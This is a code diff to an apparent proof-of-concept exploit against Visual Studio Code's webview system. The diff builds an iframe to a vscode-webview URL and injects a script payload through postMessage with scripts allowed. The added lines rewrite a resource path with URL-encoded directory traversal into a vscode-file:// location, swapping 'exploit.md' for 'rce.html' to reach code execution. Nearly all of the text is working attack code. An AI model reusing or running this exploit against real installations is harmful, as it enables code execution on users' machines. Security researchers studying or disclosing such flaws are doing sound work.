@@ -24,18 +24,34 @@ function createHTML() {
 
   srcUrl = `vscode-webview://${extensionId}/index.html?id=${extensionId}&amp;swVersion=2&amp;extensionId=vscode.markdown-language-features&amp;platform=electron&amp;vscode-resource-base-authority=vscode-resource.vscode-webview.net&amp;parentOrigin=${publicUrl}`
 
-payload = `<script>window.top.frames[0].onmessage=a=>{console.log(a);try{loc=JSON.parse(a.data.args.state).resource,console.log(loc)}catch(b){console.log(b)}},window.top.postMessage({target:'${extensionId}',channel:'do-reload'},'*')`
-
+  payload = `<script>window.top.frames[0].onmessage=a=>{console.log(a);try{loc=JSON.parse(a.data.args.state).resource,console.log(loc);pwn_loc=loc.replace('file:///','vscode-file://vscode-app/g:/Hack/Microsoft%20VS%20Code/resources/app/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F').replace('exploit.md','rce.html').replace(/[a-z]%3A/,'');location.href=pwn_loc;}catch(b){console.log(b)}},window.top.postMessage({target:'${extensionId}',channel:'do-reload'},'*')`
+  
 htmlPOC = `
 <script>
+
+var channel;
+window.addEventListener('message', onMessage);
+
+function onMessage(e) {
+	console.log(e)
+	channel = e;
+	window.frames[0].onmessage = console.log
+	window.frames[0].postMessage({
+		channel: 'did-load-resource',
+		data: {}
+	})
+}
 
 function sendMessage(){
     //send post message to frame
 
     window.frames[0].postMessage({channel:"content",args:{contents:"${payload}",options:{allowScripts:true}}},"*");
 }
+
+setTimeout(function(){sendMessage()}, 3000);
+
 <\/script>
-<iframe src="${srcUrl}" onload=sendMessage()>
+<iframe src="${srcUrl}">
 `
 }
 
